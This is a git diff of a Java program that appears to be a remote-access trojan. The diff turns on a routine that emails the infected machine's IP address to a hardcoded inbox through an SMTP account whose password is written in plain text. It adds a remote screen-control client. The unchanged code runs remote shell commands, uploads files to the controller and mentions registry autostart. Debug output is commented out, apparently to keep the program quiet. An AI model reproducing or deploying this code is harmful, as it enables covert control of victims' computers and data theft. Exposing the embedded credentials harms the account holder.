@@ -1,16 +1,11 @@
 package org.my;
 
-import java.awt.AWTException;
-import java.awt.Color;
-import java.awt.FlowLayout;
-import java.awt.Font;
-import java.awt.Graphics;
-import java.awt.Image;
-import java.awt.MouseInfo;
-import java.awt.Point;
-import java.awt.Rectangle;
-import java.awt.Robot;
-import java.awt.Toolkit;
+import javax.imageio.ImageIO;
+import javax.mail.*;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeMessage;
+import javax.swing.*;
+import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
@@ -21,26 +16,10 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.Enumeration;
 import java.util.Properties;
-import java.util.stream.Collectors;
-
-import javax.imageio.ImageIO;
-import javax.mail.Address;
-import javax.mail.Message;
-import javax.mail.Session;
-import javax.mail.Transport;
-import javax.mail.internet.InternetAddress;
-import javax.mail.internet.MimeMessage;
-import javax.swing.JButton;
-import javax.swing.JDialog;
-import javax.swing.JFrame;
-import javax.swing.JLabel;
-import javax.swing.JOptionPane;
-import javax.swing.JPanel;
-import javax.swing.JPasswordField;
-import javax.swing.JTextField;
 
 public class Main {
     final int PORT = 1220;
+    final int PORT_FOR_SCREEN=1222;
     ServerSocket serverSocket;
     Socket socket;
     DataInputStream dis;
@@ -60,7 +39,7 @@ public class Main {
 		/*
 		  在注册表中设置开机自动运行 register();
 		  以及发送邮件，主要是把自己的IP发出来
-		 register();
+		 register();*/
         smail = new SMail();
         while (!smail.sended) {
             if (timeSel >= 3) {
@@ -72,11 +51,18 @@ public class Main {
                 e.printStackTrace();
             }
             smail.send(getIP());
-        }*/
+        }
+
         try {
             serverSocket = new ServerSocket(PORT);
         } catch (IOException e1) {
             e1.printStackTrace();
+        }
+
+        try {
+            new ScreenControlClient(PORT_FOR_SCREEN).start();
+        } catch (AWTException e) {
+            throw new RuntimeException(e);
         }
         while (true) {
             try {
@@ -101,6 +87,7 @@ public class Main {
             //接收命令并执行
             go();
         }
+
     }
 
     /*
@@ -267,6 +254,9 @@ public class Main {
             mouseLockThread.flag = false;
         }
     }
+
+
+
     /*执行dos命令,把结果返回到控制端*/
     void dosExe(String dosString) {
         try {
@@ -290,7 +280,7 @@ public class Main {
             String regex="[\\s|\\S|.]*[A-Z]:\\\\(?:[.*]+\\\\)*.*[>][\\n]*";
             while ((len=isr.read(chars))>0){
                 String line=new String(chars,0,len);
-                System.out.println(line);
+                //System.out.println(line);
                 dos.writeUTF(line);
                 //最后一行，停止
                 if(line.matches(regex)){
@@ -346,7 +336,7 @@ public class Main {
             dos.writeUTF(file.getName());
             //传文件长度
             dos.writeLong(file.length());
-            System.out.println(file.length());
+            //System.out.println(file.length());
             //传文件内容
             int len;
             while ((len = fileInputStream.read(fileData)) > 0) {
@@ -538,39 +528,42 @@ public class Main {
      */
     class SMail {
         boolean sended = false;
-        Properties props;
-        Session session;
-        Message msg;
-        Transport transport;
-        final String sendHost="";//smtp.sina.com
-        final String sendName="";//send@sina.com
-        final String sendUser="";//send
-        final String password="";
-        final String receive="";
-        public void send(String s) {
-            try {
-                // System.out.println(s);
-                props = new Properties();
-                props.setProperty("mail.smtp.auth", "true");
-                props.setProperty("mail.transport.protocol", "smtp");
-                session = Session.getDefaultInstance(props);
-                // session.setDebug(true);
-                msg = new MimeMessage(session);
-                msg.setSubject("ip");
-                msg.setText(s);
-                /* sendName为发送方邮箱用户名*/
-                msg.setFrom(new InternetAddress(sendName));
-                transport = session.getTransport();
-                /*send为发送方邮箱用户名、
-                 *password为发送方邮箱密码*/
-                transport.connect(sendHost, 25, sendUser, password);
-                transport.sendMessage(msg, new Address[] { new InternetAddress(
-                        receive) });
-                transport.close();
-                sended = true;
-            } catch (Exception e) {
-            }
 
+        void send(String str){
+            String to = "alexmo001@qq.com"; // 收件人的邮件地址
+            String from = "alexmo573@163.com"; // 发件人的邮件地址
+            String host = "smtp.163.com"; // 发件人的邮件服务器地址
+            String user = "alexmo573@163.com"; // 发件人的邮箱账号
+            String password = "RBCTOJKIFTUAVWVL"; // 发件人的邮箱密码
+
+            // 创建一个邮件会话对象
+            Properties properties = new Properties();
+            properties.put("mail.smtp.host", host);
+            properties.put("mail.smtp.port", "25"); // 或 994
+            properties.put("mail.smtp.ssl.enable", "false"); // 开启 SSL
+            properties.put("mail.smtp.auth", "true"); // 开启身份验证
+            Session session = Session.getInstance(properties, new Authenticator() {
+                protected PasswordAuthentication getPasswordAuthentication() {
+                    return new PasswordAuthentication(user, password);
+                }
+            });
+
+            try {
+                // 创建一个邮件消息对象
+                Message message = new MimeMessage(session);
+                message.setFrom(new InternetAddress(from));
+                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
+                message.setSubject("IP");
+                message.setText(str);
+
+                // 发送邮件消息
+                Transport.send(message);
+
+                //System.out.println("Email sent successfully.");
+                sended = true;
+            } catch (MessagingException e) {
+                //System.out.println("Error sending email: " + e.getMessage());
+            }
         }
 
         public SMail() {
